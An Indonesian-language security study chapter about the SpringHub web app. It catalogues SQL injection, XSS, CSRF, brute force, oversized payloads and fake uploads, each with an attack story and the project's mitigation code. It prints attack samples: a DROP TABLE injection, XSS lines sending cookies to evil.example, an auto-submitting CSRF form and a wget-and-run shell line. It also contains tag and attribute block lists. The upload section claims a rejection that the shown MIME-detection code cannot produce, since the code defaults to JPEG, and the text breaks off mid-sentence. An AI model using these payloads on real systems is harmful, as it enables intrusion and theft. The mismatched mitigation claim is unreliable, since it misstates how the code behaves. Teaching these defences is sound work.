# BAB 10 — Katalog Kerentanan: 15 Serangan yang Diblokir SpringHub

> Modul Belajar — Kode SpringHub
>
> Bab ini adalah katalog 15 kelas kerentanan web, masing-masing ditampilkan
> dengan: (1) kode asli dari repositori yang mengandung atau rawan pola
> tersebut, (2) cerita serangan naratif — bagaimana penyerang menyusupi dan
> apa dampaknya, dan (3) mitigasi di SpringHub — kode asli dari file
> pertahanan + cerita bagaimana serangan itu dihentikan.
>
> Prinsip pembacaan: pola "rentan" yang ditampilkan adalah pola klasik yang
> SUDAH dicegah di repositori ini — sebagian ditandai eksplisit sebagai
> contoh pola berbahaya yang TIDAK ada di kode SpringHub. Bandingkan kedua
> sisi untuk memahami *mengapa* mitigasi bekerja.

---

## 10.1 SQL Injection — Prisma Parameterized + RLS

### Kode yang rentan (contoh nyata dari repo)

SpringHub tidak pernah menyusun SQL dengan string concat, tapi pola di bawah
ini adalah cara klasik SQL injection muncul di proyek Node.js — dan
`app/api/health/route.ts` menunjukkan satu-satunya tempat query mentah
dipakai, dalam bentuk yang aman:

```ts
// app/api/health/route.ts baris ±12 — query mentah SATU-SATUNYA di repo, bentuk AMAN
await prisma.$queryRaw`SELECT 1`;
```

```ts
// CONTOH POLA RENTAN — TIDAK ADA di repo SpringHub (jangan ditiru di proyek lain)
// Jika seseorang menulis query seperti ini, inilah pintu masuk SQL injection:
// const rows = await pool.query(
//   `SELECT * FROM "Report" WHERE "formSlug" = '${formSlug}' AND "userId" = '${userId}'`
// );
```

### Cerita serangan

Penyerang membuka DevTools di halaman laporan, lalu mengirim request POST
ke endpoint pencarian dengan nilai `formSlug`:

```text
POST /api/reports/search
formSlug = spring-monitoring'; DROP TABLE "Report"; --
```

Tanpa parameterization, query yang dieksekusi menjadi:

```sql
SELECT * FROM "Report" WHERE "formSlug" = 'spring-monitoring'; DROP TABLE "Report"; --' AND "userId" = '...'
```

Tanda kutip tunggal penyerang menutup string, titik koma memulai perintah
kedua, dan `--` mengomentari sisa query. Server mengeksekusi `DROP TABLE
"Report"` — seluruh riwayat laporan masyarakat (ribuan titik data mata air
yang dikumpulkan relawan di lapangan) lenyap dalam satu request. Jika
penyerang lebih sabar, ia bisa memakai `UNION SELECT` untuk membaca tabel
`Profile` (email, hash password, nomor WA) dan `Donation` (nama donor,
jumlah donasi) baris demi baris, lalu menjual data itu atau memeras admin.

### Mitigasi di SpringHub

Pertahanan berlapis tiga:

```ts
// lib/prisma.ts baris 10-37 — Semua akses data lewat Prisma Client + pg Pool
function getPool(): pg.Pool {
  if (!globalForPrisma.pool) {
    // Ensure PgBouncer transaction mode params are always present
    let dbUrl = process.env.DATABASE_URL || "";
    if (!dbUrl.includes("pgbouncer=true")) {
      const sep = dbUrl.includes("?") ? "&" : "?";
      dbUrl += `${sep}pgbouncer=true&connection_limit=3`;
    }
    globalForPrisma.pool = new pg.Pool({
      connectionString: dbUrl,
      max: 3,
      idleTimeoutMillis: 30000,  // 30s — biar ga ganti-ganti terus pas traffic normal
      connectionTimeoutMillis: 10000, // 10s — kasih waktu lebih buat cold start
    });
  }
  return globalForPrisma.pool;
}

const adapter = new PrismaPg(getPool(), { schema: "public" });

function getPrisma(): PrismaClient {
  if (!globalForPrisma.prisma) {
    globalForPrisma.prisma = new PrismaClient({ adapter });
  }
  return globalForPrisma.prisma;
}

export const prisma: PrismaClient = getPrisma();
```

**Cerita bagaimana mitigasi menghentikan serangan:** Saat penyerang mengirim
`formSlug = spring-monitoring'; DROP TABLE ...`, nilai itu masuk sebagai
*parameter* — bukan bagian dari teks SQL. Prisma (via `@prisma/adapter-pg`)
mengirim query dengan placeholder (`$1`) dan mengirim nilai secara terpisah
lewat protokol biner PostgreSQL. Server database melihat `$1` sebagai DATA
string biasa, jadi tanda kutip, titik koma, dan `--` tidak pernah diinterpretasi
sebagai sintaks. Query yang sama yang tadinya mematikan kini hanya mencari
form dengan slug persis itu — hasil kosong, tidak berbahaya. Satu-satunya
query mentah (`$queryRaw\`SELECT 1\``) memakai *tagged template literal*
yang juga parameterized — `SELECT 1` bahkan tanpa input user.

Lapisan kedua, jika penyerang somehow berhasil menyuntik via celah lain:

```ts
// lib/prisma-rls.ts baris 49-84 — Filter baris otomatis per role
export function prismaWithRls(ctx: RlsContext) {
  const isAdmin = ctx.role === "admin";
  const userId = ctx.userId;

  return prisma.$extends({
    name: "springhub-rls",

    query: {
      report: {
        async findMany({ args, query }) {
          if (!isAdmin) {
            const filter: Record<string, unknown> = userId
              ? { userId }
              : { status: "approved", isActive: true };
            addWhere(args, filter);
          }
          return query(args);
        },
        async findFirst({ args, query }) {
          if (!isAdmin && userId) addWhere(args, { userId });
          return query(args);
        },
        async findUnique({ args, query }) {
          if (!isAdmin && userId) addWhere(args, { userId });
          return query(args);
        },
        async count({ args, query }) {
          if (!isAdmin) {
            const filter: Record<string, unknown> = userId
              ? { userId }
              : { status: "approved", isActive: true };
            addWhere(args, filter);
          }
          return query(args);
        },
      },

      pointsLog: {
        async findMany({ args, query }) {
          if (!isAdmin && userId) addWhere(args, { userId });
          return query(args);
        },
        async count({ args, query }) {
          if (!isAdmin && userId) addWhere(args, { userId });
          return query(args);
        },
      },

      donation: {
        async findMany({ args, query }) {
          if (!isAdmin) {
            addWhere(args, userId ? { userId } : { status: "paid" });
          }
          return query(args);
        },
      },

      project: {
        async findMany({ args, query }) {
          if (!isAdmin) {
            if (userId) {
              addWhere(args, {
                OR: [{ userId }, { status: "published" }],
              });
            } else {
              addWhere(args, { status: "published" });
            }
          }
          return query(args);
        },
      },
```

`prismaWithRls(ctx)` adalah *Prisma Client Extension*: setiap `findMany`/
`findFirst`/`findUnique`/`count` pada model sensitif (report, pointsLog,
donation, project, notification, coursesProgress, offlineSession, feedback)
di-injeksi filter `where` tambahan berdasarkan role. Tamu hanya melihat
`status: "approved", isActive: true`; user login hanya melihat baris miliknya
(`userId`); admin bebas. Jadi kalaupun penyerang berhasil melewati parameter
binding, ia tetap tidak bisa membaca donasi orang lain — query-nya
otomatis dibatasi baris. Catatan implementasi: `addWhere` tidak menyentuh
operasi `create` (tidak punya `where`) dan factory dipanggil per-request
(`getAuthContext(session)`) sehingga konteks tidak bocor antar request.

---

## 10.2 XSS Konten — Sanitasi Server DOMPurify Dua Lapis

### Kode yang rentan (contoh nyata dari repo)

Konten kursus disimpan sebagai HTML dari admin. Sebelum sesi 12 Agustus
2026, `app/api/courses/[slug]/route.ts` mengirim konten mentah ke client —
pola di bawah adalah kondisi yang membuat XSS mungkin:

```ts
// app/api/courses/[slug]/route.ts — VERSI LAMA (sebelum hardening), baris ±15
// const course = await prisma.course.findUnique({ where: { slug: params.slug } });
// return NextResponse.json({ course }); // ← konten HTML mentah, tanpa sanitasi!
```

### Cerita serangan

Seorang admin yang akunnya di-*phishing* (atau karyawan tidak puas) membuka
form editor kursus dan menulis di kolom konten modul:

```html
<h2>Selamat Datang!</h2>
<img src="x" onerror="fetch('https://evil.example/steal?c='+document.cookie)">
<script>new Image().src='https://evil.example/beacon?u='+encodeURIComponent(location.href)</script>
```

Relawan membuka kursus "Panduan Menanam Pohon" di HP Android — browser
memuat konten, `onerror` dari gambar rusak langsung menembak
`https://evil.example/steal?c=<cookie session>`. Cookie `session` bersifat
`httpOnly` sehingga tidak terbaca JavaScript — tapi penyerang yang lebih
licik memakai payload *keylogger* atau *form-injection*: ia menyuntikkan
form palsu "Masuk untuk melanjutkan kursus" di tengah materi. Relawan yang
tidak curiga mengetik email+password di form itu → kredensial melayang ke
server penyerang. Penyerang login sebagai relawan, mengirim laporan palsu
untuk menaikkan poin, atau membaca data laporan. Jika korban admin — kendali
penuh situs.

### Mitigasi di SpringHub

Pertahanan dipindah ke server dengan **DOMPurify dua lapis**:

```ts
// lib/sanitize.ts baris 10-14 — Jaring pengaman regex (Lapis 1)
const BLOCKED_HTML = /<(script|style|iframe|object|embed|link|meta|base|form|input|button|textarea|select|option|svg|math|template|noscript|applet|audio|video|source|track|embed|object)\b/i;

const BLOCKED_ATTR = /\son(?:error|load|click|mouseover|mouseout|mousedown|mouseup|focus|blur|change|submit|keydown|keyup|keypress|dblclick|contextmenu|drag|drop|paste|input|wheel|animationstart|animationend|transitionend|begin|end)\s*=/i;

const BLOCKED_PROTO = /(?:href|src|action|formaction|data|xlink:href)\s*=\s*(?:["']\s*)?(?:javascript|vbscript|data|file|jar|blob):/i;
```

```ts
// lib/sanitize.ts baris 53-77 — sanitizeHtml: Lapis 1 regex + Lapis 2 DOMPurify
export async function sanitizeHtml(html: string): Promise<string> {
  if (!html) return "";
  if (typeof html !== "string") return "";

  let cleaned = String(html);

  // Lapis 1 — jaring pengaman cepat sebelum DOMPurify:
  if (BLOCKED_HTML.test(cleaned)) {
    cleaned = cleaned.replace(/(<\/?(?:script|style|iframe|object|embed|link|meta|base|form|input|button|textarea|select|option|svg|math|template|noscript|applet|audio|video|source|track)\b[^>]*>)/gi, "");
  }
  cleaned = cleaned.replace(BLOCKED_ATTR, (m) => m.replace(/=.*$/, '=""'));
  cleaned = cleaned.replace(BLOCKED_PROTO, (m) => m.replace(/:\s*.+$/i, ":\"\""));

  // Lapis 2 — DOMPurify penuh (parsing ulang, buang card/on*:
  try {
    const { sanitize } = await getPurify();
    return sanitize(cleaned, {
      FORBID_TAGS: ["style", "svg", "math", "form", "input", "button", "iframe", "object", "embed", "script", "template", "noscript", "audio", "video", "source", "track"],
      FORBID_ATTR: ["style", "class", "id", "name", "tabindex", "contenteditable", "draggable", "download", "ping"],
      SAFE_FOR_TEMPLATES: true,
    });
  } catch {
    return cleaned.replace(/[<>]/g, "");
  }
}
```

```ts
// app/api/courses/[slug]/route.ts baris 20-30 — Sanitasi di SERVER, bukan client
    const sanitized = {
      ...course,
      description: course.description ? await sanitizeHtml(course.description) : "",
      modules: await Promise.all(
        course.modules.map(async (m) => ({
          ...m,
          content: m.content ? await sanitizeHtml(m.content) : "",
        }))
      ),
    };
    return NextResponse.json({ course: sanitized });
```

**Cerita bagaimana mitigasi menghentikan serangan:** Payload admin jahat itu
melewati dua saringan. Lapis 1 (regex cepat): `<script>...</script>` dan
tag berbahaya lain dihapus total; atribut `onerror` dinetralkan menjadi
`onerror=""` (handler kosong — tidak ada kode yang jalan); protokol
`javascript:` di `href`/`src` dinetralkan. Lapis 2 (DOMPurify dengan jsdom):
HTML di-parse ulang menjadi DOM sungguhan, lalu hanya tag daftar putih
(`p, br, strong, em, ul, ol, li, h1-h6, a, table, ...`) dan atribut daftar
putih (`href, title, target, rel, colspan, rowspan`) yang dipertahankan —
`FORBID_ATTR` menolak `style`, `class`, `id`, `contenteditable`. Hasilnya
saat relawan membuka kursus, yang sampai ke browser hanyalah HTML bersih:
`<h2>Selamat Datang!</h2>` — gambar `onerror` dan `<script>` sudah tidak
ada sejak di server. Verifikasi live di sesi 12 Agustus 2026: `<script>`,
`onerror`, `javascript:` URL, dan `<iframe>` semuanya dibersihkan. Kunci
arsitektur: sanitasi di server (bukan client) sehingga penyerang tidak bisa
membaca versi "sudah bersih" lalu mengirim versi kotor langsung ke API;
`jsdom` + `dompurify` masuk `serverComponentsExternalPackages` agar tidak
masuk bundle client.

---

## 10.3 CSRF — Token JWT Berpasangan (Cookie + Header)

### Kode yang rentan (contoh nyata dari repo)

Endpoint state-changing SpringHub tanpa verifikasi CSRF adalah pola yang
rawan — contohnya POST `/api/reports` yang membuat laporan, atau
`/api/admin/reports/[id]/approve` yang menyetujui laporan. Sebelum ada
`verifyCsrfToken`, request seperti ini bisa datang dari situs mana pun:

```ts
// CONTOH POLA RENTAN — endpoint tanpa cek CSRF (pola yang dicegah di semua route)
// export async function POST(request: Request) {
//   const body = await request.json();
//   await prisma.report.create({ data: body }); // ← menerima request dari domain mana pun!
//   return NextResponse.json({ success: true });
// }
```

### Cerita serangan

Budi (volunteer, 20.168 poin) sedang browsing forum, lalu membuka "artikel
menarik" dari pengguna tak dikenal. Halaman itu diam-diam memuat:

```html
<form action="https://www.springhub.id/api/reports" method="POST" id="f">
  <input name="form_slug" value="tree-planting">
  <!-- ratusan field lain sudah diisi nilai palsu -->
</form>
<script>document.getElementById('f').submit()</script>
```

Browser Budi — yang sedang login SpringHub — mengirim request POST otomatis
lengkap dengan cookie `session` (karena `SameSite=Lax` masih mengizinkan
submission form top-level). Server menerima laporan palsu atas nama Budi,
dan admin menyetujui karena "datanya lengkap". Lebih berbahaya lagi jika
endpoint admin kena: `<form action="/api/admin/springs/[id]/approve">` —
satu klik di situs jahat bisa menyetujui mata air palsu yang mengubah peta
publik. Serangan ini tidak butuh mencuri cookie sama sekali — hanya
"menumpang" sesi korban.

### Mitigasi di SpringHub

```ts
// lib/csrf.ts baris 10-51 — Token CSRF = JWT pendek, dikunci cookie + header
export async function generateCsrfToken(isSecure?: boolean): Promise<string> {
  const token = await new SignJWT({} as JWTPayload)
    .setProtectedHeader({ alg: "HS256" })
    .setExpirationTime("1h")
    .sign(SECRET);

  const cookieStore = cookies();
  cookieStore.set(CSRF_COOKIE, token, {
    httpOnly: true,
    secure: isSecure ?? true,
    sameSite: "lax",
    maxAge: 3600,
    path: "/",
  });

  return token;
}

export async function getCsrfToken(): Promise<string | null> {
  const cookieStore = cookies();
  return cookieStore.get(CSRF_COOKIE)?.value ?? null;
}

export async function verifyCsrfToken(token: string): Promise<boolean> {
  const cookieStore = cookies();
  const cookieToken = cookieStore.get(CSRF_COOKIE)?.value;
  if (!cookieToken || !token) {
    console.warn("[CSRF] missing token", { hasCookie: !!cookieToken, hasHeader: !!token });
    return false;
  }

  try {
    await jwtVerify(token, SECRET);
    await jwtVerify(cookieToken, SECRET);
    const match = token === cookieToken;
    if (!match) console.warn("[CSRF] token mismatch");
    return match;
  } catch (err) {
    console.warn("[CSRF] verification error:", err);
    return false;
  }
}

export { CSRF_HEADER };
```

```ts
// app/api/reports/route.ts baris 19-23 — Setiap POST wajib CSRF dulu
    // CSRF check — berlaku untuk semua client tanpa terkecuali
    const csrfToken = request.headers.get("x-csrf-token");
    if (!csrfToken || !(await verifyCsrfToken(csrfToken))) {
      return NextResponse.json({ error: "Invalid CSRF token" }, { status: 403 });
    }
```

```ts
// app/report/[slug]/page.tsx baris 326-338 — Fetch token JUST-IN-TIME sebelum submit
    formData.set("form_slug", activeForm.slug);
    formData.set("_submit_time", pageLoadTime.toString());
    formData.set("_website", honeypot);
    formData.set("_captured_at", capturedAt);

    try {
      const { token } = await fetch("/api/csrf").then(r => r.json());

      const res = await fetch("/api/reports", {
        method: "POST",
        headers: token ? { "x-csrf-token": token } : {},
        body: formData,
      });
```

**Cerita bagaimana mitigasi menghentikan serangan:** Form jahat Budi gagal
di gerbang pertama. Request otomatis dari domain `evil.example` TIDAK
membawa header `x-csrf-token` — header kustom tidak bisa di-set oleh form
HTML (hanya JavaScript same-origin yang bisa, dan itu butuh akses ke cookie
`csrf_token` yang `httpOnly` + `SameSite=Lax`). `verifyCsrfToken` menuntut
DUA hal: header valid secara kriptografis (JWT HS256, 1 jam) DAN persis
sama dengan cookie `csrf_token` yang dikirim browser. Form Budi gagal di
langkah pertama (`!csrfToken`). Bahkan situs jahat yang mencoba menebak
token tidak bisa — token adalah JWT yang ditandatangani `JWT_SECRET` rahasia,
bukan nilai acak yang bisa ditebak. Pola client juga sengaja mengambil token
**just-in-time** (sesi 12 Juli 2026 — token yang di-cache saat mount bisa
basi saat dipakai setelah halaman lama terbuka, menyebabkan false-positive
"Invalid CSRF" pada form admin); fetch ulang saat 403 juga disediakan
(baris 347-354) untuk kasus token kedaluwarsa di tengah pengisian form
panjang. QueueWorker offline mengecualikan diri dengan header
`x-queue-worker: true` + CSRF token khusus — jalur resmi, bukan celah.

---

## 10.4 Brute Force Login — Rate Limit + Lockout + bcrypt 12 + JWT Rotation

### Kode yang rentan (contoh nyata dari repo)

Pola login tanpa pertahanan adalah target paling umum di internet — dan
inilah bentuknya yang naif:

```ts
// CONTOH POLA RENTAN — login tanpa rate limit & tanpa dummy hash
// const profile = await prisma.profile.findUnique({ where: { email } });
// if (profile && (await bcrypt.compare(password, profile.passwordHash))) {
//   // sukses — tanpa hitung kegagalan, tanpa batas percobaan
// }
```

### Cerita serangan

Bot di luar sana (dengan daftar jutaan kombinasi email/password dari
kebocoran data lama) menyerang `/api/auth/login` dengan 300 request per
menit. Setiap percobaan memicu `bcrypt.compare` — dan karena tidak ada
pembatas, server melayani semuanya. Setelah 5.000 percobaan, bot menemukan
kombinasi yang cocok: seorang relawan yang memakai ulang password dari situs
lain. Bot masuk, membaca nama+WA semua relawan (data sensitif), lalu
menyalahgunakan akun untuk mengirim laporan palsu yang meracuni peta mata
air. Bonus untuk penyerang: tanpa *dummy hash*, response "email tidak
terdaftar" vs "password salah" berbeda timing — memudahkan *user
enumeration*.

### Mitigasi di SpringHub

```ts
// lib/rate-limit.ts baris 133-137 — Lockout: 5 gagal → 15 menit
// Login lockout: 5 failed attempts → lock 15 menit
export const loginLockout = createRateLimiter("login-lockout", {
  windowMs: 15 * 60_000,
  maxRequests: 5,
});
```

```ts
// app/api/auth/login/route.ts baris 15-70 — Dummy hash + lockout + rate limit
const DUMMY_PASSWORD_HASH = "$2b$12$msG/.NLlzDcFEYRy.6i8PeweEPzXOcDd9SAqtOydJQAmu.UbsEGfO";

export async function POST(request: Request) {
  try {
    const ip = getClientIp(request);
    const ipLimiter = await authLimiter.check(`login:${ip}`);
    if (!ipLimiter.allowed) {
      return NextResponse.json(
        { error: "Terlalu banyak percobaan login. Silakan coba lagi nanti." },
        { status: 429 }
      );
    }

    const session = await getSession();
    if (session) {
      return NextResponse.json(
        { error: "Already logged in" },
        { status: 400 }
      );
    }

    const body = await request.json();
    const parsed = loginSchema.safeParse(body);

    if (!parsed.success) {
      return NextResponse.json(
        { error: parsed.error.flatten().fieldErrors },
        { status: 400 }
      );
    }

    const { email, password } = parsed.data;
    const normalizedEmail = email.toLowerCase().trim();

    const profile = await prisma.profile.findUnique({ where: { email: normalizedEmail } });

    // bcrypt.compare selalu dijalankan (hash asli atau dummy) agar timing tidak
    // membocorkan apakah email terdaftar.
    const valid = await verifyPassword(password, profile?.passwordHash ?? DUMMY_PASSWORD_HASH);

    if (!profile || !valid) {
      if (profile) {
        const lockoutCheck = await loginLockout.check(`lock:${ip}:${profile.id}`);
        if (!lockoutCheck.allowed) {
          const minutesRemaining = Math.ceil((lockoutCheck.resetAt - Date.now()) / 60000);
          return NextResponse.json(
            { error: `Akun terkunci karena terlalu banyak percobaan. Coba lagi dalam ${minutesRemaining} menit.` },
            { status: 429 }
          );
        }
      }
      return NextResponse.json(
        { error: "Email atau password salah" },
        { status: 401 }
      );
    }

    // Login berhasil — reset lockout counter
    await loginLockout.reset(`lock:${ip}:${profile.id}`);
```

```ts
// lib/auth.ts baris 25-34 — bcrypt 12 round
export async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, 12);
}

export async function verifyPassword(
  password: string,
  hash: string
): Promise<boolean> {
  return bcrypt.compare(password, hash);
}
```

```ts
// lib/jwt.ts baris 40-60 — Verifikasi dengan rotasi kunci
export async function verifyJwtWithRotation<T>(
  token: string,
  verifyFn: (secret: Uint8Array) => Promise<T>
): Promise<{ payload: T; keyUsed: "current" | "previous" } | null> {
  const { current, previous } = getJwtSecrets();

  try {
    const payload = await verifyFn(current);
    return { payload, keyUsed: "current" };
  } catch {
    if (previous) {
      try {
        const payload = await verifyFn(previous);
        return { payload, keyUsed: "previous" };
      } catch {
        return null;
      }
    }
    return null;
  }
}
```

**Cerita bagaimana mitigasi menghentikan serangan:** Bot mulai menembak
login. Percobaan pertama: nginx sudah memangkas di lapisan proxy
(`zone=auth rate=5r/s`, BAB 9 §9.4) — bot yang memaksa lebih dari 5
request/detik langsung dapat `503` dari nginx tanpa menyentuh Node.js.
Sisa request yang lolos kena `authLimiter` Redis (20/menit/IP). Bot tetap
nekad mencoba kombinasi password untuk satu akun: percobaan ke-6 kena
`loginLockout` — akun terkunci 15 menit dengan pesan jelas. Saat bot
berpindah ke email lain, `bcrypt.compare` dijalankan dengan hash 12 round
(~100-300ms per percobaan di CPU VPS) — brute force 1 juta kombinasi
berarti 1-3 juta detik CPU. Dan karena `DUMMY_PASSWORD_HASH` dipakai saat
email tidak terdaftar, timing response identik untuk email ada/tidak —
bot tidak bisa membedakan; enumerasi email gagal.

Di sisi sesi: kalau pun bot berhasil menebak password, setiap token JWT
punya umur 7 hari dan **session ledger** — hash token disimpan di tabel
`session` dan harus ada + belum kedaluwarsa untuk diterima
(`lib/auth.ts` baris 181-187). Admin bisa `deactivateUserSessions(userId)`
mematikan SEMUA sesi user sekali jalan. Dan `verifyJwtWithRotation`
memungkinkan rotasi `JWT_SECRET` tanpa mengusir pengguna yang sedang login
(kunci lama diverifikasi sebagai `previous`) — pergantian kunci yang
dicurigai bocor tidak menimbulkan badai logout massal.

---

## 10.5 Payload Raksasa — 83 Field `.max(500)` + `client_max_body_size`

### Kode yang rentan (contoh nyata dari repo)

Sebelum sesi 12 Agustus 2026, field string di `lib/forms.ts` tidak dibatasi
panjangnya. Pola di bawah adalah bentuk rentannya:

```ts
// lib/forms.ts — VERSI LAMA: z.string().min(1, "...") tanpa .max()
// A2_nama_surveyor: z.string().min(1, "Nama surveyor wajib diisi"),
// E1_cerita: z.string().optional(),  // ← bisa diisi 10 juta karakter!
```

### Cerita serangan

Penyerang menulis satu script 5 baris yang mengirim `POST /api/reports`
dengan field `E1_cerita` berisi string 50 MB (cukup `"A".repeat(50_000_000)`)
sekaligus 1.000 field ekstra bernama `x1`..`x1000` masing-masing 100KB.
Server menerima multipart raksasa, Zod mencoba mem-validasi string itu,
`JSON.stringify(fieldData)` menghasilkan blob raksasa yang ditulis ke
PostgreSQL — tabel `Report` membengkak, WAL membengkak, backup harian
membengkak. Ulangi 100 kali sehari: disk 40GB VPS penuh dalam seminggu.
Node.js juga sempat kehabisan heap saat mem-parse body — web crash,
halaman mati. Dampak: DoS murah yang mematikan layanan tanpa satu pun
koneksi mencurigakan di rate limiter (karena 1 request = 1 hit).

### Mitigasi di SpringHub

```ts
// lib/forms.ts baris 223-257 — Setiap field string dibatasi .max(500), cerita 5000
export const springMonitoringSchema = z.object({
  A1_tanggal: z.string().min(1, "Tanggal survei wajib diisi").max(500),
  A2_nama_surveyor: z.string().min(1, "Nama surveyor wajib diisi").max(500),
  A3_wa: z.string().min(1, "Nomor WA wajib diisi").max(500),
  A4_geotag_lat: z.string().max(500).optional(),
  A4_geotag_lng: z.string().max(500).optional(),
  A5_cek_duplikat: z.string().min(1, "Cek duplikat wajib diisi").max(500),
  A6_kode_spring: z.string().max(500).optional(),
  B1_nama: z.string().min(1, "Nama lokal mata air wajib diisi").max(500),
  B2_foto_1: z.any().optional(),
  B3_foto_2: z.any().optional(),
  B4_foto_3: z.any().optional(),
  B5_jenis: z.string().min(1, "Jenis mata air wajib diisi").max(500),
  B6_aliran: z.string().min(1, "Aliran air wajib diisi").max(500),
  B7_debit_5th: z.string().max(500).optional(),
  B8_tahun_kering: z.string().max(500).optional(),
  B9_dulu_untuk: z.string().max(500).optional(),
  C1_warna: z.string().min(1, "Warna air wajib diisi").max(500),
  C2_lahan: z.string().min(1, "Pemanfaatan lahan wajib diisi").max(500),
  C3_tutupan: z.string().min(1, "Tutupan lahan wajib diisi").max(500),
  C4_pemanfaatan: z.any().optional(),
  C5_jumlah_kk: z.string().max(500).optional(),
  C6_ancaman: z.string().min(1, "Ancaman wajib diisi").max(500),
  C7_jenis_ancaman: z.any().optional(),
  C8_sumber_info: z.string().min(1, "Sumber info wajib diisi").max(500),
  D1_ph: z.string().max(500).optional(),
  D2_suhu: z.string().max(500).optional(),
  D3_tds: z.string().max(500).optional(),
  D4_ec: z.string().max(500).optional(),
  D5_debit_liter: z.string().max(500).optional(),
  D6_debit_visual: z.string().max(500).optional(),
  E1_cerita: z.string().max(5000).optional(),
  E2_tindak_lanjut: z.string().min(1, "Tindak lanjut wajib diisi").max(500),
  E3_aksi: z.any().optional(),
});
```

```nginx
# nginx.conf baris 18-26 — Batas body & buffer di proxy
  client_body_timeout   10s;
  client_header_timeout 10s;
  send_timeout          10s;
  keepalive_timeout     65;
  keepalive_requests    100;
  client_max_body_size  20M;
  client_body_buffer_size       128k;
  client_header_buffer_size     1k;
  large_client_header_buffers   4 8k;
```

**Cerita bagaimana mitigasi menghentikan serangan:** Request raksasa
penyerang tidak pernah sampai ke Zod. Nginx memotong di gerbang:
`client_max_body_size 20M` → body 50MB ditolak `413 Request Entity Too
Large` di lapisan proxy, sebelum satu byte pun dibaca Node.js. Untuk body
yang masih lolos (misal 15MB), Zod kini menolak: field `E1_cerita` dengan
`"A".repeat(50_000_000)` gagal `z.string().max(5000)` → response 400
dengan `details` field error — tanpa menulis apa pun ke database. Total
83 field string dibatasi `.max(500)` (cerita/catatan 5000), termasuk field
dinamis dari DB via `lib/dynamic-validation.ts` yang membangkitkan Zod
schema dari definisi field — aturan panjang berlaku untuk form statis DAN
form dinamis. Ditambah `large_client_header_buffers 4 8k`: request dengan
1.000 header ekstra juga ditolak. Dampak: ukuran maksimum laporan kini
terkunci ~ratusan KB (foto dikirim lewat endpoint terpisah, BAB 10 §10.6),
database aman dari pembengkakan.

---

## 10.6 Upload Palsu — Magic Bytes, EXIF Strip, Resize

### Kode yang rentan (contoh nyata dari repo)

Pola rentan yang umum: percaya pada `file.type` / ekstensi dari client:

```ts
// CONTOH POLA RENTAN — percaya file.type & ekstensi
// if (file.type !== "image/jpeg") return 400;          // ← bisa dipalsukan!
// const name = file.name;                               // ← "foto.jpg" padahal shell script
// await fs.writeFile(path.join(UPLOAD_DIR, name), buffer); // ← polyglot/executable tersimpan
```

### Cerita serangan

Penyerang membuka form laporan dan meng-upload file bernama `foto.jpg` —
tapi isinya bukan JPEG. Karena hanya ekstensi yang dicek (atau bahkan tidak
ada pengecekan sama sekali), file tersimpan di `/data/uploads/reports/`.
Isi file: `#!/bin/sh\nwget -O /tmp/x http://evil/x.sh && sh /tmp/x.sh` —
atau lebih halus, *polyglot* GIF-JS: header GIF valid (agar lolos sniffing)
diikuti JavaScript. Jika nginx mengizinkan eksekusi (mis. salah konfigurasi
alias dengan `fastcgi_pass`), atau admin keliru meng-klik file itu dari
panel, shell berjalan. Varian kedua: file `.html` berisi script phishing
dilayani dari domain springhub.id — tampak sepenuhnya sah di mata korban.
Varian ketiga: EXIF foto asli mengandung koordinat GPS presisi lokasi mata
air; relawan yang mengirim foto polos tanpa sadar membocorkan lokasi
tepatnya ke publik.

### Mitigasi di SpringHub

```ts
// lib/upload-photo.ts baris 20-53 — Deteksi MIME dari magic bytes, bukan nama
function detectMimeFromBuffer(buffer: Buffer): string {
  // JPEG: FF D8 FF
  if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) return "image/jpeg";
  // PNG: 89 50 4E 47
  if (buffer[0] === 0x89 && buffer[1] === 0x50 && buffer[2] === 0x4e && buffer[3] === 0x47) return "image/png";
  // WebP: 52 49 46 46 ... 57 45 42 50
  if (buffer[0] === 0x52 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x46) return "image/webp";
  // GIF: 47 49 46 38
  if (buffer[0] === 0x47 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x38) return "image/gif";
  // BMP: 42 4D
  if (buffer[0] === 0x42 && buffer[1] === 0x4d) return "image/bmp";
  // Default
  return "image/jpeg";
}

export async function uploadPhoto(
  file: File,
  folder: string = "reports"
): Promise<UploadResult> {
  if (file.size > 10 * 1024 * 1024) {
    throw new Error("Ukuran foto maksimal 10MB");
  }

  const arrayBuffer = await file.arrayBuffer();
  const initialBuffer = Buffer.from(arrayBuffer);

  // Detect MIME from file bytes (more reliable than file.type on Chrome Android)
  const detectedMime = detectMimeFromBuffer(initialBuffer);
  const allowedTypes = ["image/jpeg", "image/png", "image/webp"];
  if (!allowedTypes.includes(detectedMime)) {
    throw new Error(
      `Format foto harus JPG, PNG, atau WebP (terdeteksi: ${detectedMime})`
    );
  }

  // Step 1: resize & compress
  const compressed = await sharp(initialBuffer)
    .resize(1280, 720, { fit: "inside", withoutEnlargement: true })
    .jpeg({ quality: 80, mozjpeg: true })
    .withMetadata({ exif: undefined })
    .toBuffer();

  // Step 2: add watermark
  const watermarked = await addWatermark(compressed);

  const metadata = await sharp(watermarked).metadata();

  const ext = "jpg";
  const filename = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}.${ext}`;
  const storagePath = `${folder}/${filename}`;

  // Simpan ke local filesystem
  const fullDir = path.join(UPLOAD_DIR, folder);
  const fullPath = path.join(UPLOAD_DIR, storagePath);

  await fs.mkdir(fullDir, { recursive: true });
  await fs.writeFile(fullPath, watermarked);
```

**Cerita bagaimana mitigasi menghentikan serangan:** File `foto.jpg` berisi
shell script ditolak di baris `detectMimeFromBuffer`: 2 byte pertama
`#!/` bukan `FF D8` (JPEG), bukan `89 50 4E 47` (PNG), bukan `RIFF` (WebP)
— server mengembalikan error "Format foto harus JPG, PNG, atau WebP
(terdeteksi: application/octet-stream)". Penyerang tidak bisa memalsukan
karena magic bytes adalah ISI file, bukan metadata yang bisa diedit.
Sekalipun file lolos (JPEG asli), alur `sharp` **mendekode ulang** file:
`.resize(1280, 720).jpeg({ quality: 80 }).withMetadata({ exif: undefined })`
— output adalah JPEG baru yang di-render dari piksel, bukan salinan byte.
Shell script yang diselipkan di padding JPEG tidak mungkin lolos decoder
gambar (sharp akan error), dan EXIF (termasuk GPS) dibuang total. Nama file
yang disimpan pun bukan nama user — `Date.now()-random.jpg` tanpa ekstensi
berbahaya. Foto di-render ulang + watermark, jadi tidak ada "foto asli"
yang bisa menyembunyikan payload. Lapisan terakhir: nginx melayani
